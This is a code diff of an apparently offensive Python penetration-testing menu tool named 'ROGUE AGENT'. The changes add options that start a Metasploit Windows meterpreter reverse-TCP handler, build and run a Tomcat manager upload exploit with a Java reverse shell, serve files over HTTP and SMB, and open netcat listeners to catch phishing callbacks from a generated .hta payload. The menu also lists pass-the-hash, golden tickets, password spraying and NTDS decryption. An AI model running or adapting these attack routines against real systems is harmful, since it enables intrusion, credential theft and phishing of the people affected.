@@ -544,10 +544,10 @@ def options():
    print('\u2551' + "(05) Re/Set USER   NAME (16) Dump  DNS SERVER (27) DCOMExec (38) Find EndPoints (49) Kerbero Spray (60) CrackMapExe (71) GenSSHkeyID (82) Hydra HTTP (93) Netcat   " + '\u2551')
    print('\u2551' + "(06) Re/Set PASS   WORD (17) NMap  LIVE PORTS (28) PS  Exec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
    print('\u2551' + "(07) Re/Set NTLM   HASH (18) NMap PORTService (29) SMB Exec (40) RpcClient Serv (51) HASHs Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF TOMCAT (95) MSSQL    " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85)            (96) MySQL    " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSF  SHELL (96) MySQL    " + '\u2551')
    print('\u2551' + "(09) Re/Set DOMAIN NAME (20)                  (31)          (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) Evil WinRm (97)          " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN  SID (21)                  (32)          (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) Dir Searchs (87) RemDesktop (98)          " + '\u2551')
-   print('\u2551' + "(11) Re/Set SHARE  NAME (22)                  (33)          (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) FreeRDPX11 (99) Exit     " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Start HTTPServer (32)          (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) Dir Searchs (87) RemDesktop (98)          " + '\u2551')
+   print('\u2551' + "(11) Re/Set SHARE  NAME (22) Start SMB Server (33)          (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) FreeRDPX11 (99) Exit     " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -564,7 +564,7 @@ Yellow = '\e[1;93m'
 Reset  = '\e[0m'
 
 command("echo '" + Red + "'")
-command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return; sleep 1")
+command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return"); time.sleep(1)
 command("clear; cat " + dataDir + "/banner0.txt")
 command("echo '" + Yellow + "'")
 print("\t\t\t\t\t\t               T R E A D S T O N E  E D I T I O N                \n")
@@ -716,70 +716,6 @@ if":" in TIP:
    IP46 = "-6"
 else:
    IP46 = "-4"
-   
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub                                                               
-# Version : TREADSTONE                                                             
-# Details : Start HTTP server.
-# Modified: N/A                                                               	
-# -------------------------------------------------------------------------------------
-
-print("[*] Starting HTTP server...")
-command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
-command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return")
-command("xdotool type 'python3 -m http.server 8080'; xdotool key Return")
-
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub                                                               
-# Version : TREADSTONE                                                             
-# Details : Start SMB server
-# Modified: N/A                                                               	
-# -------------------------------------------------------------------------------------
-
-print("[*] Starting SMB server...")
-command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return")
-command("xdotool type 'clear; cat " + dataDir + "/banner2.txt'; xdotool key Return")
-command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return")
-
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub                                                               
-# Version : TREADSTONE                                                             
-# Details : Start metersploit server.
-# Modified: N/A                                                               	
-# -------------------------------------------------------------------------------------
-
-print("[*] Starting metasploit server...")
-with open("meterpreter.rc", "w") as write:
-   write.write("use exploit/multi/handler\n")
-   write.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
-   write.write("set LHOST " + localIP + "\n")
-   write.write("clear\n")
-   write.write("cat " + dataDir + "/banner3.txt\n")
-   write.write("run\n")   
-   
-command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
-command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
-
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub                                                               
-# Version : TREADSTONE                                                             
-# Details : Start phishing server.
-# Modified: N/A                                                               	
-# -------------------------------------------------------------------------------------
-
-print("[*] Starting phishing server...")
-command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
-command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return")
-command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return")
-command("xdotool key Ctrl+Shift+Tab")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -1360,41 +1296,56 @@ while True:
       if checkParams != 1:
          command("nmap " + IP46 + " --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
       prompt()
-
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
 # Details : Menu option selected - 
+# Details : 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '20':
-      exit(1)
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - 
-# Details : 32/64 bit
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '21':
      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
-# Details : 32/64 bit
+# Details : Start HTTP server.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '21':
+      print("[*] Starting HTTP server...")
+      
+      command("xdotool key Ctrl+Shift+T")
+      command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return"); time.sleep(1)
+      command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return"); time.sleep(1)
+      command("xdotool type 'python3 -m http.server 8080'; xdotool key Return"); time.sleep(1)
+      command("xdotool key Ctrl+Tab")      
+      
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Start SMB server.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '22':
-      exit(1)
+      print("[*] Starting SMB server...")
+
+      command("xdotool key Ctrl+Shift+T")
+      command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return"); time.sleep(1)
+      command("xdotool type 'clear; cat " + dataDir + "/banner2.txt'; xdotool key Return"); time.sleep(1)
+      command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return"); time.sleep(1)
+      command("xdotool key Ctrl+Tab")
+            
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2776,6 +2727,14 @@ while True:
          
       print("[+] Exploit created, utilise the following code snippet to activate...")
       print(colored("\nhttp://" + localIP + ":8080/payrise.hta",colour6))
+      
+      print("\n[*] Starting phishing server...")
+      
+      command("xdotool key Ctrl+Shift+T")
+      command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return"); time.sleep(1)
+      command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return"); time.sleep(1)
+      command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return"); time.sleep(1)
+      command("xdotool key Ctrl+Tab")      
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
@@ -2837,6 +2796,14 @@ while True:
                 for line in list:
                    line = line.rstrip("\n")
                    print(colored(line + "@" + DOM.rstrip(" "),colour6))                           
+         
+         print("[*] Starting phishing server...")
+                   
+         command("xdotool key Ctrl+Shift+T")
+         command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return"); time.sleep(1)
+         command("xdotool key Ctrl+Tab")      
                    
          if match == 1:
             print("\n[*] Phishing the list...")			# GO PHISHING
@@ -3124,42 +3091,61 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='84':
-      command("echo 'use exploit/multi/http/tomcat_mgr_upload' > meterpreter.rc")
-      command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
+      print("[*] Starting metasploit server...")
       
-      if "8080" in POR:
-         command("echo 'set RPORT 8080' >> meterpreter.rc")
-      else:
-         DATA = input("Please enter tomcat port number: ")
-         command("echo 'set RPORT " + DATA + "' >> meterpreter.rc")
-      
-      DATA = PAS.rstrip(" ")
-      command("echo 'set HttpPassword " + DATA + "' >> meterpreter.rc")
-      DATA = USR.rstrip(" ")
-      command("echo 'set HttpUsername " + DATA + "' >> meterpreter.rc")
-      
-      command("echo 'set payload java/shell_reverse_tcp' >> meterpreter.rc")
-      
-      command("hostname -I >> temp.tmp")
-      target = linecache.getline("temp.tmp",1)
-      one, two, three, four = target.split(" ")
-      target = two.rstrip(" ")
-      
-      command("echo 'set lhost " + target + "' >> meterpreter.rc")
-      command("echo 'run' >> meterpreter.rc")      
-      command("msfconsole -r meterpreter.rc")     
+      with open("meterpreter.rc", "w") as write:
+         write.write("use exploit/multi/http/tomcat_mgr_upload\n")
+         write.write("set RHOSTS " + TIP.rstrip(" ") + "\n")
+         if "8080" in POR:
+            write.write("set RPORT 8080\n")
+         else:
+            DATA = input("[*] Please enter tomcat port number: ")
+            write.write("set RPORT " + DATA + "\n")
+         DATA = PAS.rstrip(" ")
+         write.write("set HttpPassword " + DATA + "\n")
+         DATA = USR.rstrip(" ")
+         write.write("set HttpUsername " + DATA + "\n")
+         write.write("set payload java/shell_reverse_tcp\n")
+         command("hostname -I >> temp.tmp")
+         target = linecache.getline("temp.tmp",1)
+         one, two, three, four = target.split(" ")
+         target = two.rstrip(" ")
+         write.write("set lhost " + target + "\n")
+         write.write("run\n")
+         
+      command("xdotool key Ctrl+Shift+T")
+      command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER TOMCAT'; xdotool key Return"); time.sleep(1)
+      command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return"); time.sleep(1)
+      command("xdotool key Ctrl+Tab")      
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - Start metersploit server.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='85':
-      exit(1)
+      print("[*] Starting metasploit server...")
+      
+      with open("meterpreter.rc", "w") as write:
+         write.write("use exploit/multi/handler\n")
+         write.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
+         write.write("set LHOST " + localIP + "\n")
+         DATA = input("[*] Please enter shell port number: ")
+         write.write("set LPORT " + DATA + "\n")
+         write.write("clear\n")
+         write.write("cat " + dataDir + "/banner3.txt\n")
+         write.write("run\n")   
+   
+      command("xdotool key Ctrl+Shift+T")
+      command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return"); time.sleep(1)
+      command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return"); time.sleep(1)
+      command("xdotool key Ctrl+Tab")      
+      
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
